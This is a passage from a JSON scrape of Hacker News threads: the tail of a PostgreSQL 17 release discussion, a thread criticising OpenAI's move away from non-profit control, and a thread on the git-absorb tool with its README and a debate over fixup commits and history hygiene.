Unless they running a super heavy workload , this solution will meet most business requirements. But this is also a gateway drug for cloud addiction. reply kjax 3 hours agorootparentAfter scanning the Azure and AWS pricing pages and calculators for comparably speced Azure Manged SQL and Amazon RDS for PostgreSQL instances, AWS's RDS comes out at about 1/3 the price of Azure Managed SQL. This matches my experience with deployments on AWS and Azure. Both are managed db instances, but Azure's is consistently more expensive for comparable offerings on AWS or GCP. reply AlfeG 1 hour agorootparentIs there any analog for Azure SQL Elastic Pools for Postgres anywhere? We pay in total something around 600 bucks to manage around 250 databases in MSSQL servers (with failover for prod databases, DTU based model) We pay for log analytics more then we pay for Sql Servers. Those Elastic Pools is a blocker for us on the way to migrate to Postgres from MSSQL... reply ilkhan4 43 minutes agorootparentIt's been a while since I've looked at elastic pools in Azure, but maybe Neon (https://neon.tech/) or recently Nile (https://www.thenile.dev/) might work in terms of spinning up a bunch of separate logical DBs with shared compute/storage. reply nikita 41 minutes agorootparent(neon ceo). We have lots of examples of this. Here is one with Retool. https://neon.tech/blog/how-retool-uses-retool-and-the-neon-a... reply manishsharan 1 hour agorootparentprevI do not have experience with AWS RDS so I cannot speak to that. In my experience, GCP Cloud SQL for Postgres has been more expensive than MS Azure SQL. In our tests, CloudSQL also was not comparable to the resiliency offered by Azure SQL. Things like Automated DR and automated failover etc. were not at par with what Azure offered. Not to mention , Column level encryption is standard for Azure SQL. reply 0cf8612b2e1e 31 minutes agorootparentprevA boolean column type. reply on_the_train 4 hours agorootparentprevExactly. Supposedly the paid solution ensures long term support. The most fun part is that our customers need to buy these database licenses, so it directly reduces our own pay. Say no to non-technical (or rational) managers : I hope SQLite3 can implement SQL/JSON soon too. I have a library of compatability functions to generate the appropriate JSON operations depending on if it's SQLite3 or PostgreSQL. And it'd be nice to reduce the number of incompatibilities over time. Is this available anywhere? Super interested reply veggieroll 3 hours agorootparentNo, it's not at the moment. Sorry! The most useful part is doing set intersection operations on JSON array's. Probably the second is extracting a value by path across both. It's not crazy to implement, SQLite was the harder side. Just a bit of fiddling with `json_each`, EXISTS, and aggregate functions. reply pbronez 3 hours agoparentprevYeah JSON_TABLE looks pretty cool. Here's the details: https://www.postgresql.org/docs/17/functions-json.html#FUNCT... reply paws 2 hours agoprevI'm looking forward to trying out incremental backups as well as JSON_TABLE. Thank you contributors! reply miohtama 4 hours agoprevThe titan keeps rocking. reply h1fra 3 hours agoprevAmazing, it's been a long time since I have been that much excited by a software release! reply monkaiju 3 hours agoprev [–] PG just continues to impress! reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "PostgreSQL 17 has been released, featuring significant enhancements in performance, scalability, and adaptability to new data access and storage patterns.",
      "Key improvements include better memory management, faster bulk loading, new SQL/JSON JSON_TABLE command, and simplified major version upgrades with new failover control.",
      "The release also introduces new TLS options, incremental backups, and enhanced monitoring tools, continuing PostgreSQL's legacy of reliability and extensibility."
    ],
    "commentSummary": [
      "PostgreSQL 17 has been released, featuring significant improvements such as vacuum operations using up to 20 times less memory and support for incremental backups.",
      "New utilities include `pg_combinebackup` for combining backups and enhancements to `postgres_fdw` for pushing EXISTS and IN subqueries to remote servers.",
      "The release has generated excitement in the community, particularly around the new `JSON_TABLE` functionality for handling JSON data within relational databases."
    ],
    "points": 390,
    "commentCount": 74,
    "retryCount": 0,
    "time": 1727356224
  },
  {
    "id": 41651548,
    "title": "OpenAI to remove non-profit control and give Sam Altman equity",
    "originLink": "https://www.reuters.com/technology/artificial-intelligence/openai-remove-non-profit-control-give-sam-altman-equity-sources-say-2024-09-25/",
    "originBody": "reuters.com#cmsg{animation: A 1.5s;}@keyframes A{0%{opacity:0;}99%{opacity:0;}100%{opacity:1;}}Please enable JS and disable any ad blockervar dd={'rt':'c','cid':'AHrlqAAAAAMAM7V2Mqr2cC4AFDcPEQ==','hsh':'2013457ADA70C67D6A4123E0A76873','t':'bv','s':43909,'e':'6c10b06da34a091105c3988a89da5026b596f8f6eb2d41e4d82d3df8a246d1b9','host':'geo.captcha-delivery.com'}",
    "commentLink": "https://news.ycombinator.com/item?id=41651548",
    "commentBody": "OpenAI to remove non-profit control and give Sam Altman equity (reuters.com)382 points by award_ 22 hours agohidepastfavorite54 comments jarbus 19 hours agoThis has been an insane, slow, public descent into everything they promised not to do, it’s so crazy to have seen people inside try to stop it reply Spacecosmonaut 6 hours agoparentIts a bit much to ask for people, in the face of such exceptional wealth prospects, to stay steadfast in their initial commitment. reply limit499karma 6 hours agorootparentExcuse me but what sort of bullshit is this? Anyone with sufficient intellectual power to grok building AI must be fully aware of the monetization value of the same. If you are navel gazing over AIG taking over humanity you must first step through the stage were capital and AI couple up. So it is not too much to ask since others who also were aware of the inherent unwanted social distortions that was entirely predictable were relying on these individuals and \"non-profit\" organizations to actually live up to their claims. As it is, it seems like a thinly disguised propaganda to recruit and benefit from altruistic and capable workers in the field to then have Sam Altman (and whoever is behind him $$$) to parachute and take over and say \"oh well, you can'tn expect people to be truthful and have principles! What are ya, a chump?\" reply 7e 10 hours agoparentprevIt's all part of the long con. reply benreesman 21 hours agoprevIf Plucky Nonprofit was OAI-1, and Abruptly Serious AI Lab was OAI-2, And Viable Commercial Product was OAI-3, and Scary Brittle Governance With Creepy NSA Ties was OAI-4, then God Emperor of Arrakis is presumably OAI-5. I figured they’d ship GPT-5 to justify OAI-5, but I guess they’ve realized that they now answer to no one on anything in practical terms. That’s terrifying. reply e12e 4 hours agoparentNit; the God Emperor arises long after the Butlerian Jihad banned thinking machines - so it's not a great image for the rise of totalitarian artificial intelligence... reply elAhmo 21 hours agoprev> Since then, OpenAI's board has been refreshed with more tech executives, chaired by Bret Taylor, former Salesforce co-CEO who now runs his own AI startup. Any corporate changes need approval from its nine-person non-profit board. Why would the non-profit board approve a change to a for-profit company? Wouldn't this be against the nature of the non-profit entity that was founded and which they are supposed to govern? reply neom 19 hours agoparentHere are the board members just to save anyone else looking it up: Bret Taylor (Chair), Sam Altman, Adam D’Angelo, Dr. Sue Desmond-Hellmann, Retired U.S. Army General Paul M. Nakasone, Nicole Seligman, Fidji Simo, Larry Summers and Zico Kolter. https://en.wikipedia.org/wiki/Bret_Taylor https://en.wikipedia.org/wiki/Sam_Altman https://en.wikipedia.org/wiki/Adam_D%27Angelo https://en.wikipedia.org/wiki/Sue_Desmond-Hellmann https://en.wikipedia.org/wiki/Paul_Nakasone https://en.wikipedia.org/wiki/Nicole_Seligman https://en.wikipedia.org/wiki/Fidji_Simo https://en.wikipedia.org/wiki/Lawrence_Summers https://csd.cmu.edu/people/faculty/zico-kolter reply pyinstallwoes 14 hours agorootparent> In May 2018, he became head of the National Security Agency, the Central Security Service and the United States Cyber Command. reply dirkc 1 hour agoparentprevI don't think you can vote to change a non-profit to a for-profit company. Once a non-profit, always a non-profit. There are sort-off loopholes, like changing the name of \"Open AI\" to something else and selling the name along with the IP to a commercial entity - EdX did this. But it's not really a loophole, since the board would need justify the price the commercial company paid and the money from the sale is still within a non-profit and bound by it's rules. reply gwern 58 minutes agorootparentExactly. The problem here is that OA is too valuable, and the non-profit owns too much of it (ie. all of it). The non-profit owns exactly 100% of the OA for-profit right now, and can cancel the \"PPUs\" any time it pleases, and if you believe Altman about the agent roadmap, would be required to do so within a few years. Now, given that the PPUs are being raised at a pseudo-marketcap of $150b, we're hearing, and that non-profits are required to sell assets for fair market value, how can the board sell its 100% ownership of the for-profit for anything less than the $150b that the market values that ownership at...? And where does one get $150b, exactly? Even Sam Altman can't pull that off. So, the whole question has been, how does he figure out how to leave the board with $75b that neither he nor anyone else has? This is where the rhetoric and preparing the grounds comes in. You can argue that OA is actually wortha name like \"AltmanAI\" could be seen as more reflective of its current leadership and business model Damn, that's harsh. And Musk said it cannot joke. reply tmikaeld 14 hours agorootparentIt can’t, it’s the most likely answer to the question based on what it knows. Which kind of makes it funnier reply benreesman 11 hours agorootparentprevI also find it curious if not distressing that this wasn’t pinned at #1 all day. To be clear: I’m quite sure that @dang is deeply committed to running a clean shop on moderation. But whether something highly unlikely and slightly sensational like a finger on the scales, or the far more likely and utter banal explanation that people in vast numbers see their fates as intertwined with the status quo, the result is the same: on some deep institutional level HN is never going to hold Altman to account. So the question becomes, what authority handles the cases the community can’t? On paper that’s regulators and legislators. Those folks ostensible and actual missions aren’t identical, and differ more with time, but they intersect at “prevent would-be autocrats being so brazen as to provoke de facto revolt”. The public doesn’t hate Big Tech generally and its sociopath fringe specifically enough to make it a true wedge issue yet, but it’s trending that way. I’d go so far as to say that most almost anyone breathing the Bay air isn’t capable of truly internalizing how deeply the general public loathes the modern Valley machine: it’s dramatically more than Wall St at any time. It’s getting even trickier than usual to predict which historical social norms are still bright lines, but “profiting personally via using a charity as a vehicle for fraud” is still putting popular people in prison with bipartisan support. And Altman isn’t popular even here. He’s feared here, but loved almost nowhere. reply rightbyte 11 hours agorootparentIf you remember Altmans coup, which was branded as a board coup against him, there were a lot of supporters here on HN trying to manufacture consent. reply benreesman 10 hours agorootparentI know. When I said he’s feared here I didn’t mean by everyone, and by me never. It sounds like you also refuse to live in fear of the goblin child of pg’s overconfidence in the joint character estimation of himself and Jessica and pg’s sloppy personal entanglements writ large as de facto public policy. Almost no one thinks this is ok. A plurality if not a majority is still willing to co-sign because of various pressures. reply tim333 10 hours agorootparentprevI was mildly suportive of Altman. I guess I was wrong. reply benreesman 10 hours agorootparentA lot of very smart people acting in good faith had that investment in the benefit of the doubt betrayed, and for an eminently relatable reason: historically trustworthy figures stopped declaring their conflicts of interest at some point and thereby became exploiters of those who respected their judgement. The real test is who carries on now that the lupine avarice has been utterly unmasked. reply mirekrusin 5 hours agoparentprevNowClosedAI reply Stem0037 16 hours agoprevI'm a bit concerned about how this might impact their commitment to AI safety though. The non-profit structure was supposed to be a safeguard against profit-driven decision making. Will they still prioritize responsible AI development as a regular for-profit company? reply tivert 15 hours agoparent> I'm a bit concerned about how this might impact their commitment to AI safety though. Their commitment will remain unparalleled, because AI safety actually means doing whatever it takes to provide maximum return to the shareholders, no matter the social cost. reply mewpmewp2 15 hours agoparentprevDepends how they predict it to affect their bottom line. reply ericzawo 13 hours agoparentprevlmao what do you think? reply tim333 10 hours agoprevThat Sam is a shifty one. Here's him 4 months ago: “It's so deeply unimaginable to people to say i don’t really need more money... If I were to say I'm going to try and make a trillion dollars with OpenAI it would save a lot of conspiracy theories” And now having turned OpenAI into closed AI he's trying to give himself $10bn in equity. reply superultra 8 hours agoprevThis felt inevitable which is why it’s not front page everywhere. It also doesn’t help that we’re in a bit of a lull with AI. I was with friends who don’t work in tech and AI came up in conversation at dinner. The general consensus is that AI is kinda dumb but it does a great job helping everyone write nicer emails. But I don’t think I’m being alarmist when I say that this moment, when the altruistic ideals get suddenly pushed to the side, may be the moment noted in history books before whatever it is that this leads us to happens. I don’t mean evil machines are next, but I do think it’s a cotton gin, telegram over the ocean, light bulb, AARPNET moment. Maybe even more impactful than those. Manhattan project? TBD I guess. Which is why I believe we’ll regret that we didn’t move slower or enforce more collective stop gaps behind the unbridled force of capitalism and the public goodwill. I’m not a doomsayer but you can’t tell me something isn’t up when this much money is involved. reply auggierose 6 hours agoparentWould you have recommended moving slower to build the first atom bomb? reply consteval 5 hours agorootparentYes. We used those bombs for evil beyond our comprehension. I encourage all Americans to further research Hiroshima and Nagasaki. Our propaganda has told us our war crimes were completely justified, but a more neutral historical analysis reveals this isn't the case. reply minimaxir 22 hours agoprevThis is, uh, interesting timing to put it mildly given Mira Murati's departure. reply krick 15 hours agoparentI imagine the decision making was in reverse order. reply ac130kz 15 hours agoprevClosedAI reply blackeyeblitzar 22 hours agoprevIt’s so weird that the person behind Loopt has now come fully in charge of this company and perverted its initial goals so completely. I’m still not clear on what Sam has accomplished or why he was put in charge of YC or OpenAI. Also apparently chairman of Helion Energy (fusion startup). Masterclass in failing up. reply rightbyte 21 hours agoparentI think it is the same reason rich people throw money after Adam Neumann post Wework. They know it is a con and wanna be part of it. They see themself as alpha-wolfes to badass to be losers. Compare to people that shill as true believers in different strange crypto Ponzi-schemes. They think they are in on it. Being so good that you get in charge of YC, and not fired by PG at all, makes you perfect to meta-morph 'OpenAI' into some dystopian big corp, as seen. reply limit499karma 5 hours agoparentprevHe is an effective bullshit artist with no moral restraint and capital behind the scene promotes and pushes him and his type as they are the perfect match for their role as \"captains\" of \"industry\". The 'building' of these fronts is a collaborative effort, with definitive media element of which even HN is likely included. reply d--b 21 hours agoparentprevAt this stage though, he has no more place to fail up to! reply T-A 21 hours agorootparenthttps://x.com/sama/status/1717941041721139488 reply d--b 17 hours agorootparentI stand corrected, thanks reply ren_engineer 22 hours agoprevand apparently removing the cap on returns for investors reply habosa 16 hours agoprevOnce Sam Altman has consolidated all the power (think: top-10 richest person in the world and control over AGI v0) we’ll find out what he actually wants. And we will hate it. reply EamonnMR 4 hours agoparentHis bunker kinda tells me all I need to know. reply dalant979 20 hours agoprevhttps://old.reddit.com/r/AskReddit/comments/3cs78i/whats_the... a historic reminder reply lysace 19 hours agoprevIt is weird that I get this news item from my local general interest newspaper in Europe but not from the HN front page, isn't it? Posted another source (https://news.ycombinator.com/item?id=41653028) since I feel this needs a discussion. This one has a more descriptive headline though. reply booleanbetrayal 19 hours agoparentI also am a bit mystified as to why this isn't trending to the front. reply tazu 16 hours agorootparentIt's probably because of the poorly-designed \"flamewar detector\" that censors posts if they are upvoted/downvoted too quickly. @dang explained it to me a few weeks ago[1] on another YC-related post that conveniently got scrubbed from the front page. [1]: https://news.ycombinator.com/item?id=41510285 reply NewJazz 18 hours agorootparentprevNot sure, but HN might down weight reuters due to paywall, and this story seems to be a Reuters-exclusive. reply freetime2 19 hours agoparentprevCurrently there is another OpenAI story on the front page about about Mira Murati leaving [1], and a couple of comments there are also talking about this news of OpenAI removing non-profit control [2] [3]. I tend to agree that this is the bigger story and more worthy of being on the front page, but HN tends to enjoy a bit of celebrity gossip so not surprising to me that the news of the CTO leaving would get more traction. I don't think it's any sort of conspiracy if that's what you're implying. [1] https://news.ycombinator.com/item?id=41651038 [2] https://news.ycombinator.com/item?id=41653013 [3] https://news.ycombinator.com/item?id=41651601 reply lysace 18 hours agorootparentI see what you mean, but at the same time there is a value in this being discussed on its own. The celebrity gossip story is currently covering up the actual important news. (Yeah, I'll go with with that conspiracy theory, also known as a classic PR move.) reply blackeyeblitzar 19 hours agoparentprevYes very weird this isn’t on the front page reply rvz 22 hours agoprev [–] Probably now everyone is starting to realize that Sam Altman really is far worse than Elon and everyone was very late to understand this after the coup that happened nearly a year ago. Perhaps this is what Mira, Greg and IIya saw in Sam; his true intentions after that coup. This 'non-profit' / 'for-profit' complication structure + taking capped investment won't be tried again in a very long time after these events. reply peanuty1 19 hours agoparent [–] Mira was appointed CEO after Sam was fired and she fought to bring back Sam, no? Why are people now saying she was part of the coup that fired Sam? reply Atotalnoob 16 hours agorootparent [–] There is a New York Times article that states Mira wrote a memo to the board reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "OpenAI is shifting from non-profit control, granting equity to Sam Altman, which has sparked criticism for potentially contradicting the company's original mission.",
      "Critics argue that this move may compromise AI safety and shift focus towards profit-driven decisions, raising ethical concerns.",
      "The timing of this transition coincides with the departure of Mira Murati, adding to the controversy and concerns about leadership priorities."
    ],
    "points": 382,
    "commentCount": 54,
    "retryCount": 0,
    "time": 1727296308
  },
  {
    "id": 41653191,
    "title": "Git-absorb: Git commit –fixup, but automatic",
    "originLink": "https://github.com/tummychow/git-absorb",
    "originBody": "git absorb This is a port of Facebook's hg absorb, which I first read about on mozilla.dev.version-control: Facebook demoed hg absorb which is probably the coolest workflow enhancement I've seen to version control in years. Essentially, when your working directory has uncommitted changes on top of draft changesets, you can run hg absorb and the uncommitted modifications are automagically folded (\"absorbed\") into the appropriate draft ancestor changesets. This is essentially doing hg histedit + \"roll\" actions without having to make a commit or manually make history modification rules. The command essentially looks at the lines that were modified, finds a changeset modifying those lines, and amends that changeset to include your uncommitted changes. If the changes can't be made without conflicts, they remain uncommitted. This workflow is insanely useful for things like applying review feedback. You just make file changes, run hg absorb and the mapping of changes to commits sorts itself out. It is magical. Elevator Pitch You have a feature branch with a few commits. Your teammate reviewed the branch and pointed out a few bugs. You have fixes for the bugs, but you don't want to shove them all into an opaque commit that says fixes, because you believe in atomic commits. Instead of manually finding commit SHAs for git commit --fixup, or running a manual interactive rebase, do this: git add $FILES_YOU_FIXED git absorb --and-rebase git absorb will automatically identify which commits are safe to modify, and which staged changes belong to each of those commits. It will then write fixup! commits for each of those changes. With the --and-rebase flag, these fixup commits will be automatically integrated into the corresponding ones. Alternatively, you can check its output manually if you don't trust it, and then fold the fixups into your feature branch with git's built-in autosquash functionality: git add $FILES_YOU_FIXED git absorb git log # check the auto-generated fixup commits git rebase -i --autosquash master Installing The easiest way to install git absorb is to download an artifact from the latest tagged release. Artifacts are available for Windows, MacOS, and Linux (built on Ubuntu with statically linked libgit2). If you need a commit that hasn't been released yet, check the latest CI artifact or file an issue. Alternatively, git absorb is available in the following system package managers: Repository Command Arch Linux pacman -S git-absorb Debian apt install git-absorb DPorts pkg install git-absorb Fedora dnf install git-absorb FreeBSD Ports pkg install git-absorb Homebrew and Linuxbrew brew install git-absorb MacPorts sudo port install git-absorb nixpkgs stable and unstable nix-env -iA nixpkgs.git-absorb openSUSE zypper install git-absorb Ubuntu apt install git-absorb Void Linux xbps-install -S git-absorb GNU Guix guix install git-absorb Compiling from Source You will need the following: cargo Then cargo install git-absorb. Make sure that $CARGO_HOME/bin is on your $PATH so that git can find the command. ($CARGO_HOME defaults to ~/.cargo.) Note that git absorb does not use the system libgit2. This means you do not need to have libgit2 installed to build or run it. However, this does mean you have to be able to build libgit2. (Due to recent changes in the git2 crate, CMake is no longer needed to build it.) Note: cargo install does not currently know how to install manpages (cargo#2729), so if you use cargo for installation then git absorb --help will not work. Here is a manual workaround, assuming your system has a ~/.local/share/man/man1 directory that man --path knows about: wget https://raw.githubusercontent.com/tummychow/git-absorb/master/Documentation/git-absorb.1 mv git-absorb.1 ~/.local/share/man/man1 Usage git add any changes that you want to absorb. By design, git absorb will only consider content in the git index (staging area). git absorb. This will create a sequence of commits on HEAD. Each commit will have a fixup! message indicating the message (if unique) or SHA of the commit it should be squashed into. If you are satisfied with the output, git rebase -i --autosquash to squash the fixup! commits into their predecessors. You can set the GIT_SEQUENCE_EDITOR environment variable if you don't need to edit the rebase TODO file. If you are not satisfied (or if something bad happened), git reset --soft to the pre-absorption commit to recover your old state. (You can find the commit in question with git reflog.) And if you think git absorb is at fault, please file an issue. How it works (roughly) git absorb works by checking if two patches P1 and P2 commute, that is, if applying P1 before P2 gives the same result as applying P2 before P1. git absorb considers a range of commits ending at HEAD. The first commit can be specified explicitly with --base . By default the last 10 commits will be considered (see Configuration below for how to change this). For each hunk in the index, git absorb will check if that hunk commutes with the last commit, then the one before that, etc. When it finds a commit that does not commute with the hunk, it infers that this is the right parent commit for this change, and the hunk is turned into a fixup commit. If the hunk commutes with all commits in the range, it means we have not found a suitable parent commit for this change; a warning is displayed, and this hunk remains uncommitted in the index. Configuration Stack size When run without --base, git-absorb will only search for candidate commits to fixup within a certain range (by default 10). If you get an error like this: WARN stack limit reached, limit: 10 edit your local or global .gitconfig and add the following section [absorb] maxStack=50 # Or any other reasonable value for your project One fixup per fixable commit By default, git-absorb will generate separate fixup commits for every absorbable hunk. Instead, can use the -F flag to create only 1 fixup commit for all hunks that absorb into the same commit. To always have this behavior, set [absorb] oneFixupPerCommit = true Auto-stage all changes if nothing staged By default, git-absorb will only consider files that you've staged to the index via git add. However, sometimes one wants to try and absorb from all changes, which would require to stage them first via git add .. To avoid this extra step, set [absorb] autoStageIfNothingStaged = true which tells git-absorb, when no changes are staged, to auto-stage them all, create fixup commits where possible, and unstage remaining changes from the index. Fixup target always SHA By default, git-absorb will create fixup commits with their messages pointing to the target commit's summary, and if there are duplicate summaries, will fallback to pointing to the target's SHA. Instead, can always point to the target's SHA via: [absorb] fixupTargetAlwaysSHA = true TODO implement force flag implement remote default branch check add smaller force flags to disable individual safety checks stop using failure::err_msg and ensure all error output is actionable by the user slightly more log output in the success case more tests (esp main module and integration tests) document stack and commute details more commutation cases (esp copy/rename detection) don't load all hunks in memory simultaneously because they could be huge implement some kind of index locking to protect against concurrent modifications",
    "commentLink": "https://news.ycombinator.com/item?id=41653191",
    "commentBody": "Git-absorb: Git commit –fixup, but automatic (github.com/tummychow)374 points by striking 18 hours agohidepastfavorite213 comments burntsushi 15 hours agoThe negativity in the comments here is unwarranted in my opinion. I've been using `git absorb` for years and it works amazingly well. I use it in addition to manual fixups. My most common uses of git-absorb, but definitely not the only, are when I submit a PR with multiple commits and it fails CI for whatever reason. If fixing CI requires changes across multiple commits (say, lint violations), then git-absorb will almost always find the right commit for each change automatically. It saves the tedium of finding the right commit for each change. False positives are virtually non-existent in my experience. False negatives do happen, but then you just fall back to the manual approach. It seems like some would reply and say PRs should just be one commit. Or that they will be squashed anyway. And sure, that is sometimes the case. But not always. I tend to prefer logically small commits when possible, and it's not always practical to break them up across multiple PRs. Perhaps partially due to how GitHub works. I use this workflow on all of my projects on GitHub. reply menaerus 4 hours agoparentWhat is wrong with simply pushing a \"Fix linting issues\" in a new commit? It's self-contained and very well describes the (single) purpose of the commit. I share the sentiment about the \"logical small commits\", and hence I don't see that adding a new fix commit is problematic as long as it is self-contained and purposeful, but perhaps I don't understand what is the problem that this tool is trying to solve. It says > You have fixes for the bugs, but you don't want to shove them all into an opaque commit that says fixes So my understanding is that bugs were found in the PR and now you want to fix those bugs by not introducing separate \"Fix A\", \"Fix B\" and \"Fix C\" commits but you want to rewrite the history of existing N commits into N' commits so that it blends those A, B and C fixes in. Maybe I can see this being somewhat useful only ever if those N commits are pushed either directly as series as patches to the main branch or as a single merge commit, and you want to keep the S/N ratio reasonable. But otherwise I think it's a little bit problematic since it makes it harder for the reviewer to inspect and understand what changes have been done. But it also makes it harder for a developer since not all fixes are context-free, e.g. a fix for an issue found in the PR cannot always be attributed to the self-contained and single commit in your branch but it's the composition of multiple commits that actually makes this bug appear. reply cryptonector 2 hours agorootparentThe issue isn't `Fix linting issues`, the issue is a `Fix linting issues` commit for issues you introduced in the code you'll be pushing with that `Fix linting issues` commit. Nobody wants to see you pre-push dev history -- it's not at all interesting. So rebase and squash/fixup such commits, split/merge commits -- do what you have to to make the history you do push to the upstream useful. Now, if you find linting issues in the upstream and fix those, then a `Fix linting issues` commit is perfectly fine. reply nothrabannosir 26 minutes agorootparentprev“Fix lint” commits also taint git blame. You could perhaps add some kind of filter to git blame to automatically skip commits whose message is “fix lint” but at some point the cure is worse than the disease. I also see people argue that merge commits make git bisect harder than squashing in the first place but there is a third option: rebase and fast forward. If every commit in your branch is clean and stand-alone that’s viable. Linter fix commits break that paradigm. reply homebrewer 3 hours agorootparentprevIt makes git bisect more difficult than it needs to be. reply menaerus 1 hour agorootparentmerge-commits or patch-series are already making it vastly more difficult for git-bisect than linear history with single self-contained commits. I used both and git-bisect on merge-commits is a nightmare. reply codetrotter 1 hour agorootparentprevYeah. But for that we can squash everything into a single commit on merge. Instead of spending a bunch on time making every single commit in an MR perfect both in isolation and all-together. And if squashing everything in the MR causes a problem with the git history being too coarse, then that is almost certainly because the MR itself should have been split up into multiple MRs. Not because of how you organized the individual commits that belonged to one MR. reply burntsushi 42 minutes agorootparentThe goal isn't perfection. Splitting PRs has overhead, especially depending on what code hosting platform you're using. Do you advocate for making code easier to read and understand by humans? What would you do if someone told you, \"no I don't want to waste my time trying to make it perfect.\" It's the same misunderstanding. I try to treat code history like I treat code: I do my best to make it comprehensible to humans. And yes, sometimes multiple PRs is better. But sometimes multiple commits in one PR are better. I use both strategies. reply codetrotter 22 minutes agorootparentI make multiple commits in the PR and squash it all on merge. If the resulting squash is too big / touches too many things, it’s because I didn’t split the MR where I probably should have. Because to me, the bigger waste of time is fiddling with all of the commits in the MR just to make it so that the MR can be merged without squashing. If someone needs fine-grained history about how exactly a specific feature or bug fix came to be, they can always go to the MR itself and look at what happened there. reply burntsushi 13 minutes agorootparent> I make multiple commits in the PR and squash it all on merge. Sometimes I do that. But sometimes I want the history I've curated in my PR to be preserved without the overhead of creating separate PRs (which then often need to be stacked, introducing problems of its own). In which case, I avoid things like \"fixup lint\" commits. And that's where git-absorb shines. And saving time is exactly the point! git-absorb helps you curate history faster. > If someone needs fine-grained history about how exactly a specific feature or bug fix came to be, they can always go to the MR itself and look at what happened there. That's a lot more work than just reading the commit log. But I agree, one can do this ifneedbe. But it's nice to avoid when possible. reply Gabrys1 2 hours agorootparentprevExactly this reply baq 4 hours agorootparentprev> What is wrong with simply pushing a \"Fix linting issues\" in a new commit? if you want every individual commit be buildable then it is a no-go. it's also a no-go if you don't squash your prs. reply menaerus 57 minutes agorootparentRed main branch is not what I am talking about at all. I am referring to the code being developed in a feature/bug-fix branch that is yet to be merged with main branch. OP believes that even in the development branch you should not fix your WIP code by adding \"Fix linting issues\". I thought that was implied by the nature of discussion since rewriting history of the code that resides already on the main branch would be beyond my understanding. reply recursive 3 hours agorootparentprevWhat do the semantic commit purists do when a rebase causes some arbitrary commit to go from red to green? I've always wondered about that. Commit A becomes A' in a rebase. A is good, but A' is not. A' might be 20 commits ago in a feature branch. reply burntsushi 2 hours agorootparentIt's hard to follow your example. You say \"go from red to green\" which I read as \"go from failing to passing,\" but then you go on to say \"A becomes A'\" where \"A is good, but A' is not.\" Either way, the answer is that if that commit is in your patch series that hasn't been merged yet, that it might make sense to just rewrite A'. But it might not. It could be a ton of work. But also, 20 commits in one branch is rather large, and maybe that's probably wrong too. I suppose a purist might say you should go clean up the history so that you have no failing commits, but I don't know anyone who is a true purist. You don't have to be. Instead of living in a word of black-or-white, join me in embracing the grey. I don't treat commit history as something that must be perfect. I just try to treat history like I treat the source code itself: I write it for other humans. Is the history always perfectly comprehensible? Nope. Just like the source code. reply recursive 2 hours agorootparentYeah, that's what I meant. I guess at the end it's all weighted tradeoffs for me too. I just put less weight on legibility and more on the ability to work on branches co-operatively without force-pushing. reply burntsushi 2 hours agorootparentIf you're working on a branch cooperatively, then yes, don't rewrite history. But maybe you do rewrite history before merging to main to clean it up, depending. And this is also why workflow questions are hard. Because \"working on branches co-operatively\" was previously unstated. It's not universal. I rarely work on branches co-operatively in a long term sort of way. Sometimes I might \"take over\" a branch to get it merged or similar, but rewriting history in that context is still fine. It is always the case, even among so-called purists, that you don't rewrite history that you're sharing with others. (Unless you've both agreed to it. But even then, it better be short-lived because it's annoying.) reply beart 4 hours agorootparentprevIn some teams, you are not allowed to submit any commit that breaks the build, and a lint failure would be considered a broken build. reply codetrotter 1 hour agorootparentDo these teams run the pipeline on all the commits when you push multiple commits at the same time to your branch? Say I have an open MR from a branch that I’ve pushed three commits to so far. I pushed these three commits individually and the pipeline ran green each time. A coworker of mine points out some errors to me. I have to touch files that I previously touched in the past three commits again. I am tempted to commit these changes in one commit. But I decide to try git absorb instead. So instead of adding one fourth, green commit to my MR, my use of git absorb rewrites all three of my previous commits. But actually, the changes I was about to put in the fourth commit only work when taken together. Splitting them up and rewriting the previous three commits will result in build failure if you try to build from the new first commit or the new second commit. I don’t notice that because I’m on the new third commit. I force push the three new commits to my branch for my MR. Gitlab runs the pipeline on the last of the commits. Everything looks fine to me. Your team lead approves the MR and pushes the merge button. Three months later he scolds me for a broken bisect. reply menaerus 1 hour agorootparentprevWe are talking about the commit, or series of commits thereof, during the development of code in feature/bug-fix branch and not about the commit that you push as a post-fix because one of your previous commits broke something. That was not the discussion as far as my understanding goes. reply barbazoo 3 hours agorootparentprevYou're right, most places I've worked this applies only to a subset of branches, usually main/master and sometimes other branches considered \"stable\" such as for the staging env. reply burntsushi 4 hours agorootparentprev> What is wrong with simply pushing a \"Fix linting issues\" in a new commit? It's self-contained and very well describes the (single) purpose of the commit. Because I care a lot more about the logical history of the source code versus the actual history of the source code. Commits like \"fix linting issues\" are more like artifacts of the development process. The commit exists likely because you forgot to run the linter earlier, and only found the issue after creating the commit. Logically speaking, those fixes belong with the relevant change. Now, if you're just going to squash the PR you're working on, then sure. The extra commit totally doesn't matter. Make as many of those commits as you want. But if your PR is 5 commits that you want to \"rebase & merge\" as-is (which is something I do pretty frequently), and you care about the history being easy to navigate, then it can totally make sense to do fixups before merging instead of creating new \"fix linting issues\" commits. If the follow the latter, then your commit history winds up being littered with those sorts of things. And fewer commits will likely pass tests (because you created new commits to fix tests). I want to be VERY CLEAR, that I do not agree with your use of the word \"wrong.\" I do not want to call your workflow wrong. Communicating the nuances and subtleties of workflows over text here is very difficult. For example, one take-away from my comment here is that you might think I always work this way. But I don't! I use \"squash & merge\" plenty myself, in which case, git-absorb is less useful. And sometimes breaking a change down into small atomic commits is actually a ton of work, and in that case, I might judge it to not be worth it. And still yet other times, I might stack PRs (although that's rare because I find it very annoying). It always depends. > But otherwise I think it's a little bit problematic since it makes it harder for the reviewer to inspect and understand what changes have been done. But it also makes it harder for a developer since not all fixes are context-free, e.g. a fix for an issue found in the PR cannot always be attributed to the self-contained and single commit in your branch but it's the composition of multiple commits that actually makes this bug appear. I'm having a hard time understanding your concern about the reviewer. But one aspect of breaking things down into commits is absolutely to make it easier for the reviewer. Most of my PRs should be read as a sequence of changes, and not as one single diff. This is extremely useful when, in order to make a change, you first need to do some refactoring. When possible (but not always, because sometimes it's hard), I like to split the refactor into one commit and then the actual interesting change into another commit. I believe this makes it easier for reviewers, because now you don't need to mentally separate \"okay this change is just refactoring, so no behavior changes\" and \"okay this part is where the behavioral change is.\" In the case where you can't easily attribute a fix to one commit, then absolutely, create a new commit! There aren't any hard rules here. It doesn't have to be perfect. I just personally don't want to live in a world where there are tons of \"fix lint\" commits scattered through the project's history. But of course, this is in tension with 